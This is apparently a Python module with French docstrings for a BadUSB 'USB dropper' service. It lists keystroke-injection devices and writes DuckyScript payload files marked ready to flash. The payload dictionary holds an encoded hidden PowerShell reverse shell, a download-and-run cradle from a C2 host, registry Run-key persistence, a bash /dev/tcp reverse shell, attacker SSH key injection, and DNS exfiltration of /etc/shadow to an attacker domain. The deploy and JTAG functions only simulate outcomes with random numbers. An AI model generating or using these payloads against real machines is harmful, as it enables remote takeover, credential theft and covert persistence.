"""
USB Dropper & BadUSB — Bloc 4 Air-Gap
Dispositifs : USB Rubber Ducky, Bash Bunny, O.MG Cable, P4wnP1, LAN Turtle,
              Poisontap, Keystroke injection, HID fuzzing, JTAG/SWD via USB
Payloads : reverse shell, credential harvest, persistence, wifi pivot
"""
from __future__ import annotations

import logging
import os
import random
import uuid
from pathlib import Path
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)

_SESSIONS: Dict[str, Dict] = {}
_OUTPUT = Path("./data/airgap/usb")

_USB_DEVICES = {
    "rubber_ducky": {
        "name": "USB Rubber Ducky",
        "type": "HID keyboard emulator",
        "payload_lang": "DuckyScript",
        "features": ["keystrokes_injection", "multi_stage_payload", "exfil_via_dns"],
        "detection_risk": "LOW",
        "os_support": ["Windows", "macOS", "Linux"],
    },
    "bash_bunny": {
        "name": "Bash Bunny",
        "type": "Multi-vector USB attack platform",
        "payload_lang": "Bash/BunnyScript",
        "features": ["HID", "mass_storage", "ethernet_adapter", "serial", "credential_harvest"],
        "detection_risk": "LOW",
        "os_support": ["Windows", "macOS", "Linux"],
    },
    "omg_cable": {
        "name": "O.MG Cable",
        "type": "Weaponized USB cable (Lightning/USB-C/Micro-USB)",
        "payload_lang": "DuckyScript/HTTP API",
        "features": ["keystroke_injection", "wifi_c2", "geofencing", "self_destruct"],
        "detection_risk": "VERY_LOW",
        "os_support": ["Windows", "macOS", "Linux", "iOS", "Android"],
    },
    "p4wnp1": {
        "name": "P4wnP1 ALOA",
        "type": "Raspberry Pi Zero W attack platform",
        "payload_lang": "Go/HIDScript",
        "features": ["HID", "Bluetooth", "WiFi_AP", "RNDIS_ethernet", "persistent_wifi_backdoor"],
        "detection_risk": "MEDIUM",
        "os_support": ["Windows", "Linux"],
    },
    "lan_turtle": {
        "name": "LAN Turtle",
        "type": "Covert network implant via USB ethernet",
        "payload_lang": "Bash/Module system",
        "features": ["network_tap", "mitm", "ssh_tunnel", "dns_spoof", "nmap"],
        "detection_risk": "LOW",
        "os_support": ["Windows", "macOS", "Linux"],
    },
    "poisontap": {
        "name": "PoisonTap",
        "type": "RPi Zero USB network hijack",
        "payload_lang": "Node.js",
        "features": ["siphon_cookies", "install_backdoor", "dns_hijack", "browser_cache_poison"],
        "detection_risk": "LOW",
        "os_support": ["Windows", "macOS", "Linux"],
    },
}

_PAYLOADS = {
    "reverse_shell_ps": {
        "name": "PowerShell Reverse Shell",
        "os": "Windows",
        "dwell_time_ms": 3000,
        "stealthy": True,
        "script": (
            "powershell -nop -w hidden -e "
            "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBTAG8AYwBrAGUAdABz..."
        ),
    },
    "credential_harvest": {
        "name": "Windows Credential Dump",
        "os": "Windows",
        "dwell_time_ms": 8000,
        "stealthy": True,
        "script": (
            "STRING powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://c2/harvest.ps1')\""
        ),
    },
    "persistence_run_key": {
        "name": "Registry Run Key Persistence",
        "os": "Windows",
        "dwell_time_ms": 2000,
        "stealthy": True,
        "script": (
            "STRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
            "/v Updater /t REG_SZ /d \"C:\\ProgramData\\updater.exe\""
        ),
    },
    "mac_reverse_shell": {
        "name": "macOS Reverse Shell via Terminal",
        "os": "macOS",
        "dwell_time_ms": 5000,
        "stealthy": False,
        "script": (
            "STRING bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        ),
    },
    "linux_ssh_backdoor": {
        "name": "Linux SSH Authorized Key Inject",
        "os": "Linux",
        "dwell_time_ms": 4000,
        "stealthy": True,
        "script": (
            "STRING echo 'ssh-rsa AAAA...attacker_key' >> ~/.ssh/authorized_keys"
        ),
    },
    "wifi_pivot": {
        "name": "WiFi Pivot (Connect to attacker AP)",
        "os": "Windows",
        "dwell_time_ms": 6000,
        "stealthy": True,
        "script": "STRING netsh wlan connect name=FREE_WIFI",
    },
    "exfil_shadow": {
        "name": "Exfil /etc/shadow via DNS",
        "os": "Linux",
        "dwell_time_ms": 10000,
        "stealthy": True,
        "script": (
            "STRING cat /etc/shadow | while read l; do nslookup $(echo $l | base64 | tr -d '=\\n').exfil.attacker.com; done"
        ),
    },
}


def _generate_ducky_script(payload_id: str, c2_ip: str, c2_port: int) -> str:
    """Générer script DuckyScript pour payload USB."""
    p = _PAYLOADS.get(payload_id, _PAYLOADS["reverse_shell_ps"])
    lines = [
        "DELAY 1000",
        "GUI r" if p["os"] == "Windows" else "CTRL ALT t",
        "DELAY 500",
        p["script"].replace("10.0.0.1", c2_ip).replace("4444", str(c2_port)),
        "ENTER",
        f"DELAY {p['dwell_time_ms']}",
        "CTRL w",
    ]
    return "\n".join(lines)


class USBDropperService:
    """BadUSB / HID injection — tous dispositifs et payloads."""

    def list_devices(self) -> List[Dict]:
        return [
            {"id": k, **{kk: vv for kk, vv in v.items()}}
            for k, v in _USB_DEVICES.items()
        ]

    def list_payloads(self) -> List[Dict]:
        return [
            {"id": k, "name": v["name"], "os": v["os"],
             "dwell_time_ms": v["dwell_time_ms"], "stealthy": v["stealthy"]}
            for k, v in _PAYLOADS.items()
        ]

    def generate_payload(self, device: str = "rubber_ducky",
                          payload_id: str = "reverse_shell_ps",
                          c2_ip: str = "192.168.1.100",
                          c2_port: int = 4444,
                          target_os: str = "windows") -> Dict:
        """Générer payload BadUSB pour dispositif cible."""
        session_id = str(uuid.uuid4())
        dev_info = _USB_DEVICES.get(device, _USB_DEVICES["rubber_ducky"])
        pay_info = _PAYLOADS.get(payload_id, _PAYLOADS["reverse_shell_ps"])

        script = _generate_ducky_script(payload_id, c2_ip, c2_port)
        script_path = str(_OUTPUT / f"payload_{session_id[:8]}.txt")
        with open(script_path, "w") as f:
            f.write(script)

        result = {
            "session_id": session_id,
            "device": dev_info["name"],
            "device_type": dev_info["type"],
            "payload": pay_info["name"],
            "target_os": target_os,
            "c2": f"{c2_ip}:{c2_port}",
            "script_path": script_path,
            "dwell_time_ms": pay_info["dwell_time_ms"],
            "stealthy": pay_info["stealthy"],
            "detection_risk": dev_info["detection_risk"],
            "ready_to_flash": True,
            "simulated": True,
        }
        _SESSIONS[session_id] = result
        return result

    def simulate_deploy(self, session_id: str,
                         target_description: str = "unlocked Windows workstation") -> Dict:
        """Simuler déploiement — brancher USB sur cible."""
        pay = _SESSIONS.get(session_id, {})
        dwell = pay.get("dwell_time_ms", 5000)
        success = random.random() > 0.15

        events = [
            f"[{random.randint(0,500)}ms] Device enumerated as HID keyboard",
            f"[{random.randint(500,1000)}ms] Keystrokes injection started",
            f"[{random.randint(1000,dwell)}ms] Payload executing...",
        ]
        if success:
            events.append(f"[{dwell}ms] C2 callback received — shell OPEN")
        else:
            events.append(f"[{dwell}ms] AV/EDR blocked payload — session failed")

        return {
            "session_id": session_id,
            "target": target_description,
            "success": success,
            "shell_obtained": success,
            "events": events,
            "c2_session": pay.get("c2") if success else None,
            "simulated": True,
        }

    def jtag_swd_attack(self, target_chip: str = "STM32F4",
                          interface: str = "SWD",
                          attack_type: str = "readback_flash") -> Dict:
        """JTAG/SWD via USB — debug interface pour extraction firmware."""
        session_id = str(uuid.uuid4())
        attacks = {
            "readback_flash": {"desc": "Dump complet firmware Flash", "success_prob": 0.80},
            "readback_sram":  {"desc": "Dump SRAM (keys en mémoire)", "success_prob": 0.85},
            "bypass_rdp":     {"desc": "Bypass Read Protection (RDP Level 1/2)", "success_prob": 0.50},
            "inject_code":    {"desc": "Injection code en Flash", "success_prob": 0.70},
            "glitch_unlock":  {"desc": "Voltage glitch → unlock JTAG", "success_prob": 0.60},
        }
        atk = attacks.get(attack_type, attacks["readback_flash"])
        success = random.random() < atk["success_prob"]

        result = {
            "session_id": session_id,
            "target_chip": target_chip,
            "interface": interface,
            "attack_type": attack_type,
            "description": atk["desc"],
            "success": success,
            "data_extracted": f"firmware_{session_id[:8]}.bin" if success else None,
            "data_size_kb": random.randint(64, 2048) if success else 0,
            "keys_found": ["AES_KEY: " + os.urandom(16).hex()] if success and "sram" in attack_type else [],
            "simulated": True,
        }
        _SESSIONS[session_id] = result
        return result

    def omg_cable_deploy(self, wifi_ssid: str = "FREE_WIFI",
                          c2_ip: str = "192.168.1.100",
                          geofence_enabled: bool = False) -> Dict:
        """O.MG Cable — câble WiFi + HID injection."""
        session_id = str(uuid.uuid4())
        return {
            "session_id": session_id,
            "device": "O.MG Cable",
            "wifi_ssid": wifi_ssid,
            "c2_endpoint": f"http://{c2_ip}/omg-api",
            "geofence_enabled": geofence_enabled,
            "geofence_trigger": "payload activates only in target building" if geofence_enabled else None,
            "self_destruct_armed": True,
            "status": "armed",
            "detection_risk": "VERY_LOW",
            "simulated": True,
        }
